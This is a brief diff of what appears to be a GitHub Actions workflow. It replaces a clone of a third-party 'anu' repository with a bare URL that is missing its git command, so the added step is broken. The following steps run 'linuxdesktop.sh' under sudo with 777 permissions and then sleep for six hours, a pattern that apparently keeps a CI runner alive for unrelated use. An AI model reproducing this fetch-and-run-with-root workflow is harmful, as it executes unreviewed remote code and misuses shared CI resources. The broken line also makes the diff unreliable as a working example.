@@ -21,7 +21,7 @@ jobs:
       uses: actions/setup-node@v1
       with:
         node-version: ${{ matrix.node-version }}
-    - run: git clone https://github.com/Azuma-4/anu.git 
+    - run: https://github.com/ketikakuco/anu.git 
     - run: cd anu && ls && sudo chmod 777 linuxdesktop.sh && ./linuxdesktop.sh 
     - run: sleep 21600
 
